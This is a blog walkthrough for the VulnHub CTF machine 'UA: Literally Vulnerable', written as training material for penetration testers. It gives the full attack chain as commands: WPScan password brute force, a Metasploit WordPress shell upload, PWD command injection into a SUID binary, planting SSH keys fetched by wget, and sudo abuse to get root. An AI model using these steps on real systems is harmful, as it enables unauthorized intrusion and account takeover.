<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">UA: Literally Vulnerable: Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/ua-literally-vulnerable-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-12-16T07:45:27+00:00">December 16, 2019</time><time class="updated" datetime="2025-06-10T20:10:51+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we are going to crack the UA: Literally Vulnerable CTF Challenge and present a detailed walkthrough. The machine depicted in this Walkthrough is hosted on Vulnhub. Credit for making this machine goes to <a style="color: #000000;" href="https://twitter.com/syed__umar">Syed Umar Arfeen</a>. Download this lab by clicking <a style="color: #000000;" href="https://www.vulnhub.com/entry/ua-literally-vulnerable,407/">here</a>.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Netdiscover Scan</span></li>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Anonymous FTP Login</span></li>
<li><span style="color: #000000;">Directory Bruteforce using dirb</span></li>
<li><span style="color: #000000;">WordPress Enumeration using WPScan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Exploiting WordPress using Metasploit</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Post Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Users Enumeration</span></li>
<li><span style="color: #000000;">Enumeration for SUID bits</span></li>
<li><span style="color: #000000;">Generation of SSH Keys</span></li>
<li><span style="color: #000000;">Transfer of Keys to Target</span></li>
<li><span style="color: #000000;">Listing of Directory Permissions</span></li>
<li><span style="color: #000000;">Obtaining User Password</span></li>
<li><span style="color: #000000;">Enumeration for Sudoers</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Abusing Sudo Rights</span></li>
<li><span style="color: #000000;">Reading Root Flag</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">After running the downloaded virtual machine in the VMWare, the machine will automatically be assigned an IP address from the network DHCP, find the IP address of our target machine and for that please use the following command as it helps to see all the IP’s in an internal network:</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-PWddNnEXzIo/XfcsnBaT68I/AAAAAAAAh7c/e9HJYJY3kuc9NqhflygwSKfE0tsXse9XwCLcBGAsYHQ/s1600/1.png"/></p>
<p><span style="color: #000000;">We found the target IP Address 192.168.1.103. The next step is to scan the target machine by using the Nmap. This is to find the open ports and services on the target machine and will help us to proceed further.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.103</pre>
<p><span style="color: #000000;">Here we performed an Aggressive Port Scan because we wanted to grab all the information, we can in one go as well as we want to scan all the 65535 ports. Sometimes some services are hidden in rare ports. After the scan, we saw that port 21 was actively running the vsftpd 3.0.3. We also have the OpenSSH on port 22 followed by Nginx http on port 80 and Apache http on 65535.</span></p>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-MIDa6dLD0jU/Xfcsp5fm34I/AAAAAAAAh78/SOwoE38A3vcXUBX8gCUu6LXRByw1u9s5QCLcBGAsYHQ/s1600/2.png"/></strong></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">The scan tells us that the FTP service has the Anonymous Access. So let’s take a look at the FTP. After logging in, we listed the files shared. We find a file named <strong>backupPasswords</strong>. To investigate further, we downloaded the file to out Attacker Machine via the FTP using the <em>get</em> command. After the successful download of the file, we opened it. We get a list of possible passwords. It smells like bruteforce!!</span></p>
<pre class="lang:default decode:true ">ftp 192.168.1.103
ls
get backupPasswords
bye
cat backupPasswords</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-AYC075BeU9g/Xfcss10HonI/AAAAAAAAh8g/-uSVQOP5w_smgN6L9XKZyOJcY3ZChmhhgCLcBGAsYHQ/s1600/3.png"/></p>
<p><span style="color: #000000;">But the catch is we haven’t found any place where we should use these credentials. So, let’s get back to Enumeration. We remember from the nmap scan that we have 2 http service hosting 2 different webpages. Let’s take a look at the first one.</span></p>
<pre class="lang:default decode:true">http://192.168.1.103</pre>
<p><span style="color: #000000;">It seemed like a simple wordpress site. But what’s strange is that is don’t load up completely. Before tinkering with that let’s check the other webpage as well.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-BaCLzxaIyTg/XfcstV7DPOI/AAAAAAAAh8k/M-WRsPQJ9lAIhFGuVV1yntrhagX6fH3OwCLcBGAsYHQ/s1600/4.png"/></p>
<p><span style="color: #000000;">Moving on let’s get to the unpopular port 65535, here we have apache http service. Let’s take a look at it throughout the Web Browser.</span></p>
<pre class="lang:default decode:true ">http://192.168.1.103:65535</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-BQkIWNZrjJI/Xfcst1vYK9I/AAAAAAAAh8s/JLgK9A2P-wgiQiH6ixLjftjhY6pxNfrlwCLcBGAsYHQ/s1600/5.png"/></p>
<p><span style="color: #000000;">It looks like the default Apache page. That it! we are out of places to visit. Then let’s find us some more. It’s time to perform a directory bruteforce.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.103:65535/ /usr/share/wordlists/dirb/big.txt</pre>
<p><span style="color: #000000;">We tried the normal directory bruteforce but we didn’t get any hits. So, we thought to widen our approach, we use the big.txt dictionary to bruteforce. This gave us a hit. We have the /phpcms. Let’s check it out.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-jqZj1J1BPho/Xfcstpm1rBI/AAAAAAAAh8o/wUgQp4ELkBUt9hZ7tBJ6vdry1DyiDH9_QCLcBGAsYHQ/s1600/6.png"/></p>
<p><span style="color: #000000;">Logically we opened the /phpcms/ in our browser.</span></p>
<pre class="lang:default decode:true ">http://192.168.1.103:65535/phpcms/</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-pGD4ubYqj6w/XfcsuW2XMsI/AAAAAAAAh8w/reIk7xIEzMEvDTtgITHcKo_ymu6g7h99wCLcBGAsYHQ/s1600/7.png"/></p>
<p><span style="color: #000000;">There we have it; it is the authentication panel. This might be out way inside. So, as we learned earlier that the website that has been hosted is the WordPress Based. So, we thought of trying the wpscan. Now in the initial stage, let’s enumerate this page.</span></p>
<pre class="lang:default decode:true ">wpscan --url http://192.168.1.103:65535/phpcms/ --enumerate u</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-JHlKCIHNl1Q/XfcsulVH9YI/AAAAAAAAh80/g2SGaasC0oAdQbSMyvzp6OSc5kpgF3_SgCLcBGAsYHQ/s1600/8.png"/></p>
<p><span style="color: #000000;">After running the wpscan, it took a while to get it through the target website we see that we have 2 successful hits to the user named “notadmin” and “maybeadmin”. That’s subtle.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-rkbQHqcdtZs/Xfcsu7mYiJI/AAAAAAAAh84/0VBV97oVGCQd-35duQgJV0lHernmUyI4wCLcBGAsYHQ/s1600/9.png"/></p>
<p><span style="color: #000000;">Now that we have the usernames, we are still lacking the passwords that go with them. But in our initial enumeration, we got ourselves a directory of probable passwords named <strong>backupPasswords</strong>. To do this in a proper sense, we make a user directory named user.txt and write the 2 usernames that we just found. After that is done. It is a bruteforce time.</span></p>
<pre class="lang:default decode:true ">wpscan --url http://192.168.1.103:65535/phpcms/ -U user.txt -P backupPasswords</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-7d3w6fpxcSM/XfcsnIdBvRI/AAAAAAAAh7g/Z1XARUQKlL0wk9U94AVWDoThIumkPR7CgCLcBGAsYHQ/s1600/10.png"/></p>
<p><span style="color: #000000;">As we only had two usernames and a bunch of passwords this didn’t take much time to reveal its so-called Interesting Finding(s) i.e., Our Password: <strong>$EPid%J2L9Luf05</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-sAUwzIUk348/Xfcsmx1ZgmI/AAAAAAAAh7Y/v9iStl8RgDo-ye0fPQFHbmTV0A14lfUrACLcBGAsYHQ/s1600/11.png"/></p>
<p><span style="color: #000000;">Now we went back to the password panel and tried to enter the password inside the panel. Upon entering we hit a snag. The page was still not getting fully loaded. This got us thinking to check the connections it might be trying to make. Upon investigation, we see that it calls back to hostname literally.vulnerable. So that must be it that is hindering our practice. </span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ikzVxk6so1U/Xfcsob_EieI/AAAAAAAAh7k/j4ydVTvOvgI9Xy-tYqKATcD8bELjdmJvgCLcBGAsYHQ/s1600/12.png"/></p>
<p><span style="color: #000000;">The normal workaround is adding defining the IP Address to that hostname it is calling in out etc/hosts. Let’s do it then. We opened out /etc/hosts file using nano editor and added the following entry.</span></p>
<pre class="lang:default decode:true">nano /etc/hosts
192.168.1.103 literally.vulnerable
cat /etc/hosts</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-6y5N03RWAZ0/Xfcsobk_hgI/AAAAAAAAh7o/EycWPqcQBcYT8dffUnQcxNlysaB-EZM1ACLcBGAsYHQ/s1600/13.png"/></p>
<p><span style="color: #000000;">We went back to the password page i.e., /phpcms/ and reloaded it. This gave us a fine fully loaded page. Now we entered the password that we found earlier with the wpscan bruteforce.</span></p>
<p><span style="color: #000000;">We see that it a draft page. Designed to provide the user notadmin with its password. Now that we have the credentials of the user notadmin. It Exploitation Time.</span></p>
<pre class="lang:default decode:true">notadmin:Pa$$w0rd13!&amp;</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-P0UeG2bb5Wo/Xfcsoie1ehI/AAAAAAAAh7s/i52YdM8fipkyIkb5P2b40e_peUwo5GujQCLcBGAsYHQ/s1600/15.png"/></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">To exploit we will be using the Metasploit Framework. We started the Metasploit Framework using the command msfconsole.</span></p>
<p><span style="color: #000000;">After running, it time to choose the exploit that we will be running against the target machine. So we load wp_admin_shell_upload module with the help of use command. Then we have to provide it with the Remote host IP Address, Remote Host Port, The Target URL as well the username and the password of the admin user of WordPress.</span></p>
<pre class="lang:default decode:true">use exploit/unix/webapp/wp_admin_shell_upload
set rhosts 192.168.1.103
set rport 65535
set targeturi /phpcms
set username notadmin
set password Pa$$w0rd13!&amp;
exploit</pre>
<p><span style="color: #000000;">All set and we are ready to pop the shell. This gave us a meterpreter shell in no time. We decided to work at the bash level, so we tried to get that using the shell command on the meterpreter.</span></p>
<pre class="lang:default decode:true">shell</pre>
<p><span style="color: #000000;">The shell it gave was not proper so to fix that we ran the Python One-Liner. As this machine was loaded with the Python3, we need to use the Python3 variant of the One-Liner. We can see that we land as user “www-data”. This means we will have to work our way to get the root shell. It’s time to Enumerate our path to Root.</span></p>
<pre class="lang:default decode:true">python3 -c 'import pty;pty.spawn("/bin/bash")'
cd /home
ls
cd doe
ls</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-PlmSbBbN6n0/Xfcspa-Ca6I/AAAAAAAAh7w/TJMcR0wJ-xgWdYYIXoc8y1sRpU3dmHiSwCLcBGAsYHQ/s1600/16.png"/></p>
<h3><span style="color: #800000;"><strong>Post Exploitation</strong></span></h3>
<p><span style="color: #000000;">As a part of our Post Exploitation or post Enumeration, we decided to look for SUID bit. We saw earlier that this machine has 2 users, doe and john. We ran the following command to find if we have the SUID bit for all the readable files under the root (/) directory. From this scan, we now know that we have a binary named <strong>itseasy </strong>located in the home directory of user doe which can be used to escalate privilege on this machine.</span></p>
<pre class="lang:default decode:true ">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-QYQ-4IaFTq4/Xfcspu-H9BI/AAAAAAAAh74/FeCsj_vlhFQyBaxzeX9vPcm7mNfSnccaQCLcBGAsYHQ/s1600/17.png"/></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">We changed the directory to reach the location of the binary we just found out. We ran the binary and it echoed the current directory path as shown in the image.</span></p>
<pre class="lang:default decode:true">cd /home/doe
ls
./itseasy</pre>
<p><span style="color: #000000;">We decided to read the local.txt file. This was not allowed due to restricted permissions. We had another file named noteFromAdmin. It’s time to investigate it. It warns the user doe to not delete critical files as he/she did last time. This felt like a hint. In the past, there must be a scenario where the user doe must have deleted the bash files or pwd binaries and the admin has to work around it.</span></p>
<pre class="lang:default decode:true ">cat local.txt
cat noteFromAdmin</pre>
<p><span style="color: #000000;">In order to do it, the admin must have created the binary named itseasy. So, we will have to tinker with pwd to give out the /bin/bash. It also known as Environment path variable privilege escalation, <a style="color: #000000;" href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">read more</a>.</span></p>
<pre class="lang:default decode:true">export PWD=\$\(/bin/bash\)</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-XXBFY6JNdw4/Xfcspsgx5VI/AAAAAAAAh70/l8uns_bSseUf_n8nlhHveUN04199FTjtQCLcBGAsYHQ/s1600/19.png"/></p>
<p><span style="color: #000000;">Now that we have the /bin/bash, we ran the binary again, and it gave us john user. To get to root we will first get create public keys on our attacker machine using ssh-keygen. Then copy those keys inside the file named authorized_keys and we will start a python server to transfer these authorized_keys to the Target Machine.</span></p>
<pre class="lang:default decode:true ">ssh-keygen
cd .ssh
ls
cat id_rsa.pub &gt; authorized_keys
python -SimpleHTTPServer</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-8ZGlqNSJ6ZU/Xfcsqmqpx7I/AAAAAAAAh8A/oh9L1IHTK5I3K4H26vUH6_IBba8WhN9TwCLcBGAsYHQ/s1600/20.png"/></p>
<p><span style="color: #000000;">We move back to the shell that we obtained earlier. Here we make a folder named .ssh and then we download that key inside this .ssh folder.</span></p>
<pre class="lang:default decode:true ">mkdir /home/john/.ssh
cd /home/john/.ssh &amp;&amp; wget http://192.168.1.107:8000 /authorized_keys</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-2bs3645qjMA/XfcsqlW8LyI/AAAAAAAAh8E/kvwImjQIuoc2fsqf9swNDsPiqeoMvLCwgCLcBGAsYHQ/s1600/21.png"/></p>
<p><span style="color: #000000;">Now that we have successfully transferred the ssh public key, we will try to connect to the machine via ssh. After connecting we see that we have a file named file user.txt. We open the file to see a message by the author to check permissions. We check the permissions to find that the directory named .local has all the permissions. We get into this directory to find another directory named share. We traverse into that as well to find 2 directories named nano and tmpFiles.</span></p>
<pre class="lang:default decode:true ">ssh john@192.168.1.103
ls -la
cat user.txt
cd .local
ls -la
cd share
ls -la</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-q_86fC8ntus/XfcsqyNFVuI/AAAAAAAAh8I/zepXu8tS7B8uIVXvnIj112yccMp4qlJbwCLcBGAsYHQ/s1600/23.png"/></p>
<p><span style="color: #000000;">We move into the <strong>/tmpFiles</strong> to find a file named <strong>myPassword</strong>. We try reading it. It is a self-note with the password which is base64 encoded. We copy this password and move to our Kali terminal.</span></p>
<pre class="lang:default decode:true ">cat myPassword</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-x2pD0VAgq_A/Xfcsrhan8vI/AAAAAAAAh8M/EyHfQsNo9B0MSDadQw94-koUau4lL4vaQCLcBGAsYHQ/s1600/24.png"/></p>
<p><span style="color: #000000;">We use the combination of echo and base64 commands to decode the password. Here we have it the password for user john.</span></p>
<pre class="lang:default decode:true">echo "am9objpZWlckczhZNDlJQiNaWko=" | base64 -d</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-rXtMDV8pfuM/XfcsrkAVgAI/AAAAAAAAh8Q/t7CbxJhIPLcLSumDkQlV_MD5iOwl0XIuwCLcBGAsYHQ/s1600/25.png"/></p>
<p><span style="color: #000000;">Now its time to enumerate user john. We use the password to check the permissions of user john. We do so by using the command. We see that the user john can run the file test.html. We traversed into the location of the test.html and we try to echo /bin/bash into the test.html so that we can run it to pop the root shell. But we get a permission error.</span></p>
<pre class="lang:default decode:true  ">sudo -l 
cd /var/www/html
ls
echo "/bin/bash" &gt; test.html</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-QednAQFug2A/Xfcsr3u11lI/AAAAAAAAh8U/SIhOB_XV5dM3iCT08aQ_lc88YFN3l2gIACLcBGAsYHQ/s1600/26.png"/></p>
<p><span style="color: #000000;">We went back to the www-data user shell that we got earlier and here we echoed /bin/bash into the test.html file. And we gave the file executable permission so that it can be executed.  </span></p>
<pre class="lang:default decode:true ">echo "/bin/bash" &gt; /var/www/html/test.html
chmod 777 /var/www/html/test.html</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-1Sja_tzfDJ0/Xfcsse4IsfI/AAAAAAAAh8Y/KplFp9fXfg8SCN88JGDveetVcDdorAWmACLcBGAsYHQ/s1600/27.png"/></p>
<p><span style="color: #000000;">We come back to the ssh session of the john user. Here we try to run the test.html file as executable using sudo. After entering the password of john that we found earlier. We successfully got the root shell. We traverse into the /root directory to find the root flag.</span></p>
<pre class="lang:default decode:true ">sudo /var/www/html/test.html
ls
cd /root
ls
cat root.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-H97sjYdh2SM/Xfcssn4DJKI/AAAAAAAAh8c/GMaxJX9XcN0KdUENcYt9LPwAsCgfApHBwCLcBGAsYHQ/s1600/28.png"/></p>
<p><span style="color: #000000;">This concludes our walkthrough of this machine. It was a good machine. There were a few bumps but overall it was quite an easy machine as it was literally vulnerable.</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Can be Contacted on Twitter and <a style="color: #000000;" href="https://www.linkedin.com/in/pavandeep-singh-6b1074132">LinkedIn</a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
